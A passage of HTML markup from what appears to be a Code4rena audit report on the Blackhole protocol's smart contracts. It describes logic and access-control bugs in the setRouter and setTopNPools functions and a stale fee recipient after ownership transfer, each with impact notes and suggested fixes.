\u003ccode\u003ealgebraFeeRecipient\u003c/code\u003e when ownership is transferred. This creates a risk where the previous owner continues to receive protocol fees even after relinquishing ownership unintentionally.\u003c/p\u003e\n\u003ch3 id=\"impact-19\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-19\" aria-label=\"impact 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eRevenue leakage: Fees meant for the protocol or new owner could be misdirected to the previous owner unintentionally.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd a \u003ccode\u003etransferOwnership()\u003c/code\u003e hook that also resets or revalidates sensitive roles (like fee recipient).\u003c/p\u003e\n\u003ch2 id=\"09-incorrect-setrouter-function-only-allows-zero-address-to-pass\" style=\"position:relative;\"\u003e\u003ca href=\"#09-incorrect-setrouter-function-only-allows-zero-address-to-pass\" aria-label=\"09 incorrect setrouter function only allows zero address to pass permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[09] Incorrect \u003ccode\u003esetRouter\u003c/code\u003e function only allows zero address to pass\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L313\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L313\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-20\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-20\" aria-label=\"finding description 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eIn the GenesisPoolManager.sol contract, the \u003ccode\u003esetRouter\u003c/code\u003e function has a logic flaw. \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis means the function only allows setting the router address to zero, which is usually the opposite of the intended behavior.\u003c/p\u003e\n\u003ch3 id=\"impact-20\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-20\" aria-label=\"impact 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe owner may never be able to set a valid router.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eCorrected code:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"10-misaligned-access-control-on-settopnpools-function\" style=\"position:relative;\"\u003e\u003ca href=\"#10-misaligned-access-control-on-settopnpools-function\" aria-label=\"10 misaligned access control on settopnpools function permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[10] Misaligned access control on \u003ccode\u003esetTopNPools()\u003c/code\u003e function\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/SetterTopNPoolsStrategy.sol#L46\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/SetterTopNPoolsStrategy.sol#L46\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-21\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-21\" aria-label=\"finding description 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003esetTopNPools\u003c/code\u003e function is responsible for updating the list of top N pool addresses in the protocol:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Allows either the owner or the AVM to update top pools\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetTopNPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyExecutor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etopN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Exceeds topN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003edelete\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etopNPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Zero address not allowed\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etopNPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTopNPoolsUpdated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_poolAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs per the comment, the function is intended to be callable by either the contract owner or the AVM. However, it is protected by the \u003ccode\u003eonlyExecutor\u003c/code\u003e modifier:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003emodifier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyExecutor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexecutor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only AVM can call\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis restricts access exclusively to the executor address, which is described as the AVM. \u003cstrong\u003eThe contract owner is not authorized to call this function, despite the comment stating otherwise.\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 id=\"impact-21\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-21\" aria-label=\"impact 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eViolation of Intended Access Control: The contract comment suggests that both the owner and the AVM (executor) should be allowed to update top pools. However, the current implementation violates this expectation.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eChange the access control modifier on \u003ccode\u003esetTopNPools\u003c/code\u003e from \u003ccode\u003eonlyExecutor\u003c/code\u003e to \u003ccode\u003eonlyOwnerOrExecutor\u003c/code\u003e to align with the intended permissions.\u003c/p\u003e\n\u003ch2 id=\"11-governancecentralization-risks-21-contracts-covered\" style=\"position:relative;\"\u003e\u003ca href=\"#11-governancecentralization-risks-21-contracts-covered\" aria-label=\"11 governancecentralization risks 21 contracts covered permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[11] Governance/centralization Risks (21 contracts covered)\u003c/h2\u003e\n\u003ch3 id=\"rolesactors-in-the-system\" style=\"position:relative;\"\u003e\u003ca href=\"#rolesactors-in-the-system\" aria-label=\"rolesactors in the system permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 